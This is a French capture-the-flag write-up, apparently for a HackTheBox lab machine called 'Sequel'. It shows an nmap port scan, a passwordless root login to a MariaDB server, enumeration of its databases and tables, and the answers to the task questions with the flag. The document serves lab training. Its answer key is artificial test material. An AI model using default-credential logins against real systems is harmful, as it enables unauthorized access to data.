
# SEQUEL

![alt text](image.png)

#vulnarabilityassessment #databases #MySQL #SQL #reconnaissance #weakcredentials

## 1. Méthodologie

On commence de nouveau par une énumération de ports avec la commande `nmap -sV -p- IP_cible`:

```
└──╼ [★]$ nmap -sV -p- 10.129.168.25
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-23 15:06 CST
Nmap scan report for 10.129.168.25
Host is up (0.011s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
```

Le port 3306 est ouvert, c'est une base de données MySQL. Nous allons tenter de nous connecter à cette database avec des credentials par défaut comme `root`. La commande utilisée est `mysql -u user -h IP_cible -P port_number`. L'option `-u` spécifie le nom d'utilisateur avec lequel on se connecte, l'option `-h` spécifie l'hôte à qui on souhaite se connecter et `-P` spécifie le port sur lequel nous tentons la connexion. Nous pouvons spéficier l'option `-p` après le user afin d'entrer notre mot de passe juste après avoir lancé la commande.

```
└──╼ [★]$ mysql -u root -h 10.129.168.25 -P 3306
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 66
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

Nous allons maintenant lister les bases de données contenues sur le serveur avec la commande `show databases;` :

```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.025 sec)
```

On vient explorer les bases de données en les sélectionnant d'abord avec `use db_name;` :

```
MariaDB [(none)]> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

Nous allons maintenant regarder le contenu de chacune d'elle (leurs tables) avec la commande `show tables;` : 

```
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.010 sec)
```

Il faut ensuite explorer les tables présentes avec la commande `select * from name_table;`. Cette commande sélectionne tout dans la table en question afin d'afficher l'ensemble du contenu.

```
MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.010 sec)
```

## 2. Questions

### Task 1

During our scan, which port do we find serving MySQL?

```
3306
```

### Task 2

What community-developed MySQL version is the target running?

```
mariadb
```

### Task 3

When using the MySQL command line client, what switch do we need to use in order to specify a login username?

```
-u
```

### Task 4

Which username allows us to log into this MariaDB instance without providing a password?

```
root
```

### Task 5

In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?

```
*
```

### Task 6

In SQL, what symbol do we need to end each query with?

```
;
```

### Task 7

There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?

```
htb
```

### Flag

```
7b4bec00d1a39e3dd4e021ec3d915da8
```